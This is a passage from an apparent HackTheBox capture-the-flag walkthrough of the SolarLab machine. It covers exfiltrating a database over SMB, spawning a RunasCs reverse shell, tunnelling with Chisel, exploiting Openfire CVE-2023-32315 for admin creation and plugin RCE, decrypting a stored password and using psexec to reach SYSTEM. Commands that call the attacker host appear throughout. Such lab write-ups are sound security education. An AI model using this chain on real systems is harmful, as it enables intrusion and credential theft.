app.route('/travelApprovalForm', methods=['GET', 'POST'])(travelApprovalForm)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True, threaded=True)

```

I’ll find it in the `instance` directory:

```

PS C:\Users\blake\Documents\app\instance> ls

    Directory: C:\Users\blake\Documents\app\instance

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/2/2024  12:30 PM          12288 users.db

```

#### Database

I’ll start an SMB server and exfil the DB:

```

PS C:\Users\blake\Documents\app\instance> net use \\10.10.14.6\share /u:oxdf oxdf
The command completed successfully.
PS C:\Users\blake\Documents\app\instance> copy users.db \\10.10.14.6\share\

```

On my host, I’ll open it. There’s only one table:

```

oxdf@hacky$ sqlite3 users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
user

```

It has three users with plaintext passwords, two of which are new to me:

```

sqlite> select * from user;
id|username|password
1|blakeb|ThisCanB3typedeasily1@
2|claudias|007poiuytrewq
3|alexanderk|HotP!fireguard

```

The second one works for the openfire user:

```

oxdf@hacky$ netexec smb solarlab.htb -u openfire -p 'HotP!fireguard'
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\openfire:HotP!fireguard 

```

### RunasCs

I’ll use the [RunasCs](https://github.com/antonioCoco/RunasCs) tool to get a reverse shell as openfire. I’ll use my SMB share to copy it into `ProgramData` for staging:

```

PS C:\programdata> copy \\10.10.14.6\share\RunasCs.exe r.exe

```

Now I’ll run it:

```

PS C:\programdata> .\r.exe openfire 'HotP!fireguard' powershell -r 10.10.14.6:444 --logon-type 5 --bypass-uac

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-77180$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2296 created in background.

```

At `nc`, I get a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.16 63923
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
solarlab\openfire

```

## Shell as openfire via CVE + Plugin

### Enumeration

I’ve already noticed there’s an OpenFire account. There’s also processes in the `tasklist` output:

```

PS C:\> tasklist | findstr -i openfire
openfire-service.exe          2928                            0      4,936 K
openfire-service.exe          3084                            0    179,956 K

```

The second of those processes has a bunch of listening ports only on localhost:

```

PS C:\> netstat -ano | findstr 3084 | findstr LISTENING
  TCP    127.0.0.1:5222         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:5223         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:5262         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:5263         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:5269         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:5270         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:5275         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:5276         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:7070         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:7443         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3084
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3084

```

[This post](https://discourse.igniterealtime.org/t/openfire-and-the-command-line/48356) shows how to get the OpenFire version using command line web requests:

```

PS C:\> (curl http://localhost:9090/index.jsp).Content | findstr -i version
                        <div class="text" id="jive-loginVersion"> Openfire, Version: 4.7.4</div>

```

### CVE-2023-32315

#### Identify

Searching for “openfire cve 4.7.4” shows a bunch of results of CVE-2023-32315:

![image-20240919152244309](/img/image-20240919152244309.png)

#### Background

The [top result](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce) from vsociety\_ shows all about this vulnerability including how to, exploit the path traversal to create a new admin user, and using that to install a plugin and get RCE.

The issue is that OpenFire in some URLs isn’t properly sanitizing `%u002e`, which is a unicode encoding of dot, so `%u002e%u002e/` makes it to the server and becomes `../`. With this, I can hit the endpoints to create a user.

#### Tunnel

The easiest way to exploit this is to tunnel post 9090 on my host to port 9090 on SolarLab localhost using [Chisel](https://github.com/jpillora/chisel). I’ll host the latest binary on my Python webserver and fetch it to SolarLab. Then with the server started, I’ll connect:

```

PS C:\programdata> wget 10.10.14.6/chisel_1.10.0_windows_amd64 -outfile c.exe
PS C:\programdata> .\c.exe client 10.10.14.6:8000 R:9090:127.0.0.1:9090

```

At the server I’ll see the connection:

```

oxdf@hacky$ /opt/chisel/chisel_1.10.0_linux_amd64 server -p 8000 --reverse
2024/09/19 15:30:42 server: Reverse tunnelling enabled
2024/09/19 15:30:42 server: Fingerprint 7c+nXZ+iSyIPo1+BwAdNkyaqP23KLPb4eMndREiMn5w=
2024/09/19 15:30:42 server: Listening on http://0.0.0.0:8000
2024/09/19 15:31:02 server: session#1: tun: proxy#R:9090=>9090: Listening

```

Now visiting `localhost:9090` shows the OpenFire login:

![image-20240919153256926](/img/image-20240919153256926.png)

#### POC

To test this exploit, I’ll try to read a log file at `/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`, and it works:

![image-20240919153433480](/img/image-20240919153433480.png)

### Create Admin User

I’ll start by getting a cookie and CSRF token from `plugin-admin.jsp` in the same directory as the log file above:

![image-20240919153727014](/img/image-20240919153727014.png)

To create a user, I’ll visit `user-create.jsp` in the same directory, passing the necessary info (and with these cookies set):

![image-20240919154141478](/img/image-20240919154141478.png)

It returns 200, but also shows an exception. But it also created the user. Entering my new user creds into the form logs in. On the User Properties page for my user, I’ll see it is admin:

![image-20240919154311004](/img/image-20240919154311004.png)

### OpenFile Plugin RCE

This is the same process as the root step on [Jab](/2024/06/29/htb-jab.html#rce-plugin). The same blog post has a link to [this repo](https://github.com/miko550/CVE-2023-32315), which include a script to do what I just did manually, as well as `openfire-management-tool-plugin.jar`. I’ll download a copy of that file.

Now on “Plugins” at the top menu, there’s a form to upload a plugin:

![image-20240919154538123](/img/image-20240919154538123.png)

Once it uploads, it shows up in the list:

![image-20240919154607686](/img/image-20240919154607686.png)

Under Server –> Server Settings, Management Tool now shows up at the bottom of the left menu:

![image-20240919154707282](/img/image-20240919154707282.png)

Clicking it asks for a password, which is “123”:

![image-20240919154735781](/img/image-20240919154735781.png)

On entering, there’s a few options, but on selecting “system command” from the menu, it gives a form to execute a command:

![image-20240919155255623](/img/image-20240919155255623.png)

It works:

![image-20240919155310647](/img/image-20240919155310647.png)

Giving it the same shell from [revshells.com](https://www.revshells.com/) returns a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.16 54584

PS C:\Program Files\Openfire\bin>

```

## Shell as system

### Enumeration

As openfire, I can now access `C:\Program Files\Openfire`:

```

PS C:\Program Files\openfire> ls

    Directory: C:\Program Files\openfire

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/17/2023   2:11 PM                .install4j
d-----        11/17/2023   2:11 PM                bin
d-----         5/17/2024   9:53 PM                conf
d-----        11/17/2023   2:11 PM                documentation
d-----         5/17/2024   9:53 PM                embedded-db
d-----        11/17/2023   2:11 PM                lib
d-----        11/17/2023   2:24 PM                logs
d-----        11/17/2023   2:21 PM                plugins
d-----        11/17/2023   2:11 PM                resources
-a----         11/9/2022   5:59 PM         375002 changelog.html
-a----         2/16/2022   5:55 PM          10874 LICENSE.html
-a----         2/16/2022   5:55 PM           5403 README.html
-a----         11/9/2022   6:00 PM         798720 uninstall.exe

```

In the `embedded-db` folder there’s some small files and `openfire.script`:

```

PS C:\Program Files\openfire\embedded-db> ls

    Directory: C:\Program Files\openfire\embedded-db

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/17/2024   9:53 PM                openfire.tmp
-a----         5/17/2024   9:53 PM              0 openfire.lck
-a----         5/17/2024   9:53 PM            161 openfire.log
-a----         5/17/2024   9:53 PM            106 openfire.properties
-a----          5/7/2024   9:15 PM          16161 openfire.script

```

Inside of it, there’s a couple lines with what look like credentials being set:

```

PS C:\Program Files\openfire\embedded-db> cat openfire.script
SET DATABASE UNIQUE NAME HSQLDB8BDD3B2742
SET DATABASE GC 0
SET DATABASE DEFAULT RESULT MEMORY ROWS 0
...[snip]...
CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
...[snip]...
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e15
9a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
q
...[snip]...
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
...[snip]...

```

The SA password hash is the MD5 sum of the empty string, so that’s not too interesting.

### Decrypt

#### Find Script

Searching for Openfire password decrypt, I’ll find [this repo](https://github.com/shakaw/openfire-password-decrypt). It’s got a PHP script to decrypt a password taking the `$ciphertext` and `$key`:

```

<?
function decrypt_openfirepass($ciphertext, $key) {
	$cypher = 'blowfish';
	$mode   = 'cbc';
	$sha1_key = sha1($key, true);
	$td = mcrypt_module_open($cypher, '', $mode, '');
	$ivsize    = mcrypt_enc_get_iv_size($td);
	$iv = substr(hex2bin($ciphertext), 0, $ivsize);
	$ciphertext = substr(hex2bin($ciphertext), $ivsize);
	if ($iv) {
		mcrypt_generic_init($td, $sha1_key, $iv);
		$plaintext = mdecrypt_generic($td, $ciphertext);
	}
	return $plaintext;
}

```

#### Decrypt with Script

I can create a copy of this script with my variables on my host:

```

<?php
function decrypt_openfirepass($ciphertext, $key) {
        $cypher = 'blowfish';
        $mode   = 'cbc';
        $sha1_key = sha1($key, true);
        $td = mcrypt_module_open($cypher, '', $mode, '');
        $ivsize    = mcrypt_enc_get_iv_size($td);
        $iv = substr(hex2bin($ciphertext), 0, $ivsize);
        $ciphertext = substr(hex2bin($ciphertext), $ivsize);
        if ($iv) {
                mcrypt_generic_init($td, $sha1_key, $iv);
                $plaintext = mdecrypt_generic($td, $ciphertext);
        }
        return $plaintext;
}

echo decrypt_openfirepass('becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442', 'hGXiFzsKaAeYLjn');

```

To get it to work, I had to also `apt install php8.2-mcrypt`. Then it just works:

```

oxdf@hacky$ php decrypt.php 
ThisPasswordShouldDo!@

```

### Shell

That password is the box’s administrator password:

```

oxdf@hacky$ netexec smb solarlab.htb -u administrator -p 'ThisPasswordShouldDo!@'
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\administrator:ThisPasswordShouldDo!@ (Pwn3d!)

```

With no WinRM, SSH, or RDP, I’ll use `psexec.py` to get a shell over SMB:

```

oxdf@hacky$ psexec.py solarlab.htb/administrator:'ThisPasswordShouldDo!@'@solarlab.htb powershell
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Requesting shares on solarlab.htb.....
[*] Found writable share ADMIN$
[*] Uploading file vlfVSrWF.exe
[*] Opening SVCManager on solarlab.htb.....
[*] Creating service kEIH on solarlab.htb.....
[*] Starting service kEIH.....
[!] Press help for extra shell commands
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
nt authority\system

```

And grab the flag:

```

PS C:\users\administrator\desktop> cat root.txt
adc9cfdd************************

```